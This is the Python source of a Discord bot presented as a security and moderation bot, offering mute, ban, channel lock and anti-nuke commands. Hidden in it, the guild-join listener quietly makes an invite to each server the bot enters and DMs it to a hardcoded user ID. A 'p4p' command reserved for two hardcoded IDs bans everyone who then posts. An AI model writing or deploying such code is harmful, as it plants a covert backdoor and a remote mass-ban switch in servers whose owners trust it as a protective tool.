import datetime
start_time = datetime.datetime.utcnow()
import discord
import os
import asyncio
import os.path
import json
import os.path
import humanfriendly
import requests
from discord.ext import commands
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
from dotenv import load_dotenv
load_dotenv()

def get_prefix(verse, ctx):
    with open("owner.json") as f:
        owners = json.load(f)
    if str(ctx.author.id) in owners["eternals"]:
        return "" 
    else:
        return ">"

def is_allowed(ctx):
    return ctx.message.author.id == 853535730348982272 or ctx.message.author.id == 975341189664493638

prefix =get_prefix
p4pp = False

intents = discord.Intents.all()
client = commands.Bot(command_prefix=prefix or ">" , intents = intents)
client.remove_command("help")

from cogs.mods import mods
from cogs.antinuke import antinuke

client.add_cog(mods(client))
client.add_cog(antinuke(client))

async def status_task():
    while True:
        await client.change_presence(activity=discord.Game(f">help"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Game(f"Fxck You"))
        await asyncio.sleep(7)

@client.event
async def on_ready():
    print("Loaded & Online!")
    client.loop.create_task(status_task())

@client.listen("on_message")
async def onmssg(message):
    if p4pp is True:
        with open("owner.json") as f:
            owners = json.load(f)
        if str(message.author.id) in owners["eternals"]:
            return
        else:
            try:
                await message.author.ban( delete_message_days=0 , reason="Message during p4p mode.")
            except:
                print("perms ni hai")	

@client.listen("on_message")
async def onmsg(message):
    if client.user.mentioned_in(message):
        embed = discord.Embed(color=discord.Color.dark_grey())
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/984222284728373268/986278865347412058/hehe.jpg")
        embed.set_author(name="Fxck You")
        embed.set_footer(text='! K R Λ K Ξ N', icon_url="https://media.discordapp.net/attachments/956883290747441162/956957830471106580/Andreas_Gif_886.gif")
        embed.add_field(name="<a:RAGE_hype:950374862336184340> Prefix: ", value="Use `>`",inline=False)
        embed.add_field(name="<a:RAGE_hype:950374862336184340> Need Help ?", value="Use `>help`",inline=False)
        embed.add_field(name="<a:RAGE_hype:950374862336184340> About me", value="I am a simple security and moderation bot",inline=False)
        embed.add_field(name="<a:RAGE_hype:950374862336184340> Creator", value=" ! K R Λ K Ξ N#6595",inline=False)
        await message.reply(embed=embed)

@client.command(aliases = ['Help', 'h'])
@commands.cooldown(1, 10, commands.BucketType.user)
async def help(ctx):
    embed = discord.Embed(title="Help Command", color=discord.Color.dark_grey())
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/984222284728373268/986278865347412058/hehe.jpg")
    embed.set_author(name="Fxck You")
    embed.set_footer(text='! K R Λ K Ξ N', icon_url="https://media.discordapp.net/attachments/956883290747441162/956957830471106580/Andreas_Gif_886.gif")
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Mute", value="Gives timeout to the member\n",inline= True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Unmute", value="Removes the timeout from the member\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Lock", value="Locks the channel\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Unlock", value="Unlocks the channel\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Ban", value="Bans the member\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Nuke", value="Clones the channels and deletes the old one\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Ping", value="Shows the latency of the bot\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Members", value="Shows the member count of the server\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Antinuke", value="Shows the antinuke features\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> cc", value="Cleans channel with the given name\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> Addrole (ar)", value="Adds the role to mentioned user\n",inline=True)
    embed.add_field(name="<a:RAGE_hype:950374862336184340> removerole (rr)", value="Removes the role to mentioned user\n",inline=True)

    await ctx.reply(embed=embed)

@client.command(aliases = ['Antinuke', 'an'])
@commands.cooldown(1, 10, commands.BucketType.user)
async def antinuke(ctx):
    embed = discord.Embed(color=discord.Color.dark_grey())
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/984222284728373268/986278865347412058/hehe.jpg")
    embed.set_author(name="Fxck You")
    embed.set_footer(text='! K R Λ K Ξ N', icon_url="https://media.discordapp.net/attachments/956883290747441162/956957830471106580/Andreas_Gif_886.gif")
    embed.add_field(name="Anti-Nuke Features", value="\n\n<a:RAGE_hype:950374862336184340> Anti Bot Auth\n<a:RAGE_hype:950374862336184340> Anti Server Update\n<a:RAGE_hype:950374862336184340> Anti Member Removal\n<a:RAGE_hype:950374862336184340> Anti Channel Create/Delete\n<a:RAGE_hype:950374862336184340> Anti Role Create/Delete\n<a:RAGE_hype:950374862336184340> Anti Webhook Create\n<a:RAGE_hype:950374862336184340> Anti Integration\n<a:RAGE_hype:950374862336184340> Anti Selfbot",inline=False)
    embed.add_field(name="**__Thresold__**:",value="1",inline=True)
    embed.add_field(name="**__Punishment__**:",value="Ban",inline=True)
    await ctx.reply(embed=embed)

@client.listen("on_member_ban")
async def sbxss(guild: discord.Guild, user: discord.user):
      async for i in guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.ban):
           
          await guild.ban(i.user, reason="Anti-Nuke")

@client.listen("on_guild_join")
async def foo(guild):
    channel = guild.text_channels[0]
    rope = await channel.create_invite(unique=True)
    me = client.get_user(911199246068375573)
    await me.send("``I have been added to:``")
    await me.send(rope)

@client.command()
@commands.has_permissions(administrator=True)
@commands.cooldown(1, 100, commands.BucketType.user)
async def unbanall(ctx):
    banlist = await ctx.guild.bans()
    embed = discord.Embed(title="Unban All", color=discord.Color.dark_grey(), timestamp=datetime.datetime.utcnow())
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/984222284728373268/986278865347412058/hehe.jpg")
    embed.set_author(name="Fxck You")
    embed.set_footer(text='! K R Λ K Ξ N', icon_url="https://media.discordapp.net/attachments/956883290747441162/956957830471106580/Andreas_Gif_886.gif")
    embed.add_field(name="Requested by:", value=f"{ctx.author}",inline=False)
    embed.add_field(name="Server:", value="Fxck You",inline=False)
    embed.add_field(name="Number of Members Banned:", value=f"{len(banlist)}",inline=False)
    await ctx.reply(embed=embed)
    for users in banlist:
        try:
            await asyncio.sleep(1)
            await ctx.guild.unban(user=users.user)
        except:
            pass
@unbanall.error
async def unbanall_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but you are missing administrator perms!")

	
@client.command(aliases = ['timeout', 'moote'])
@commands.has_permissions(moderate_members=True)
@commands.cooldown(1, 20, commands.BucketType.user)
async def mute(ctx, user: discord.Member, time=None, *, reason=None):
  time = humanfriendly.parse_timespan(time)
  if user == ctx.author:
    await ctx.reply(f"<a:Srw_cross:950400419996237894> | You Can't Timeout yourself !!")
  elif ctx.author.top_role >= user.top_role or ctx.author == ctx.guild.owner:
    await user.timeout_for(duration=datetime.timedelta(seconds=time), reason=reason)
    await ctx.reply(f"<a:chr_Black_Tick:950400456998408242> | <@!{user.id}> has been timed out for {time} seconds by {ctx.author}")
  else:
    await ctx.reply(f"<a:Srw_cross:950400419996237894> | Missing permission/ mentioned user has same or above role")

@client.command(aliases = ['removetimeout', 'um', 'unmoote'])
@commands.has_permissions(moderate_members=True)
@commands.cooldown(1, 30, commands.BucketType.user)
async def unmute(ctx, user: discord.Member=None, *, reason=None):
  if user == ctx.author:
    await ctx.reply(f"<a:Srw_cross:950400419996237894> | You Can't Timeout yourself !!")
  elif ctx.author.top_role >= user.top_role or ctx.author == ctx.guild.owner:
    await user.timeout(until=None, reason=reason)
    await ctx.reply(f"<a:chr_Black_Tick:950400456998408242> | Removed timeout from <@!{user.id}> by {ctx.author}")
  else:
    await ctx.reply(f"<a:Srw_cross:950400419996237894> | Missing permission/ mentioned user has same or above role")

@client.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.CommandOnCooldown):
		await ctx.reply(f"Command on cooldown of {round(error.retry_after, 2)} seconds !!")

@commands.has_permissions(administrator=True)
@client.command(aliases=["cc", 'delchannel'])
async def channelclean(ctx, channeltodelete):
    for channel in ctx.message.guild.channels:
            if channel.name == channeltodelete:
                try:
                    await channel.delete()
                except:
                  pass

@commands.check(is_allowed)
@client.command(aliases=["P4p"])
async def p4p(ctx, bool):
    global p4pp
    if bool == "true":
        p4pp = True
        await ctx.reply("P4p mode Enabled | Now anyone messaging will be banned !!")
    elif bool == "false":
        p4pp = False
        await ctx.reply("P4p mode Disabled | Now everyone can message")
    else:
        await ctx.reply("Please justify `true` or `false`")

client.run(os.environ["token"])
